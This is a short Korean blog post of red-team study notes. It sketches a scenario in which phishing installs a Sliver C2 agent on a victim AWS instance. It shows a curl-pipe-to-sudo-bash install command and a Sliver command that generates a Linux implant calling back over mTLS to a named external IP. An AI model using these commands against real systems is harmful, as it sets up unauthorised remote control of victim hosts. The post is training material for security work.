---
title: Red Team Scenario
author: Jeongwon
date: 2025-03-15 22:08:00 +0900
categories: [Career, RedTeam]
tags: [writing]
render_with_liquid: false
---
## Red Team Scenario
`REF` : [Red Raccoon - 레드팀 플레이북](https://www.xn--hy1b43d247a.com/basic-redteam/overview)  | [타쿠대디 - OSCP Guide](https://takudaddy.tistory.com/439#T3)
<br><br><br>

### Initial Access && Information Collection

Phishing을 통한 피해자 호스트(AWS Instance)에 Sliver C2 서버 에이전트 설치를 가정<br>
[Sliver C2 Wiki](https://sliver.sh/docs?name=Getting+Started) | [NCSC Docs](https://www.ncsc.gov.uk/files/Advisory-further-TTPs-associated-with-SVR-cyber-actors.pdf)

```bash
sudo apt update
sudo curl https://sliver.sh/install | sudo bash
```

```bash
generate --os linux --arch amd64 --mtls 13.209.42.174:443 --save payload.exe

```

Multi-Stage Channels 활용






